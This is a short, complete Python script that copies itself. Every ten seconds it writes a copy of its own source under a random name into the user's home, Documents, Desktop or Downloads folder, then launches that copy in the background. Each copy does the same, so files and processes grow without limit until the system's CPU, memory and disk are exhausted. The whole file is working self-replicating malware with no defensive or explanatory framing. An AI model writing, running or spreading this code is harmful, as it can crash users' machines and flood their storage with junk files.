import os
import random
import sys
import time
import uuid

def get_self_code():
    """Retrieve the script's own code."""
    with open(sys.argv[0], "r") as f:
        return f.read()

def create_unique_file(base_dir, content):
    """Create a unique file in the specified directory with the given content."""
    unique_filename = f"{uuid.uuid4()}.py"
    file_path = os.path.join(base_dir, unique_filename)
    with open(file_path, "w") as f:
        f.write(content)
    return file_path

def execute_file(file_path):
    """Make the file executable and execute it."""
    os.chmod(file_path, 0o755)  # Make the file executable
    os.system(f"python {file_path} &")

def replicate():
    """Replicate the script by creating and executing new copies."""
    self_content = get_self_code()  # Get the content of the current script
    base_dirs = [
        os.path.expanduser("~"),  # User home directory
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.join(os.path.expanduser("~"), "Desktop"),
        os.path.join(os.path.expanduser("~"), "Downloads"),
    ]

    while True:
        time.sleep(10)  # Wait 10 seconds before replication
        base_dir = random.choice(base_dirs)  # Randomly select a base directory
        file_path = create_unique_file(base_dir, self_content)  # Create a replica
        execute_file(file_path)  # Execute the replica

if __name__ == "__main__":
    replicate()
